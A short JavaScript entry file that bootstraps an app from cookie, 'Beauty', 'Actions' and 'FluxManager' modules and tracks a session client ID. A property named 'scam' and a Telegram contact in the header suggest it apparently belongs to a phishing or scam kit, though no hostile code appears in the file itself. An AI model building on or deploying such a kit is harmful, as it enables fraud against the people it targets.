/**
 * Software made by 3robi
 * All rights reserved 2021
 *
 * It is strictly forbidden to distribute any copies of this software or modifications of it.
 * Telegram @prepagodigi
 */

import Cookies from "./app/Cookies.js";
import FluxManager from "./app/FluxManager.js";
import Beauty from "./app/Beauty.js";
import Actions from "./app/Actions.js";

let CLIENT_ID = (sessionStorage.getItem('clientId')) ? sessionStorage.getItem('clientId') : false

class App {
    constructor() {
        /**
         * Init Variables
         */
        this.fManager   = false
        this.beauty     = new Beauty()
        this.actions    = new Actions()
        this.scam       = 'Imagin'

        /**
         * Init Listeners
         */
        if (HAS_COOKIES) Cookies.init();
        if (HAS_BEAUTY) this.beauty.init();

        this.actions.init(this)

        this.initApp()
    }

    initApp = () => {
        this.fManager = new FluxManager(CLIENT_ID)
    }
}

const app = new App()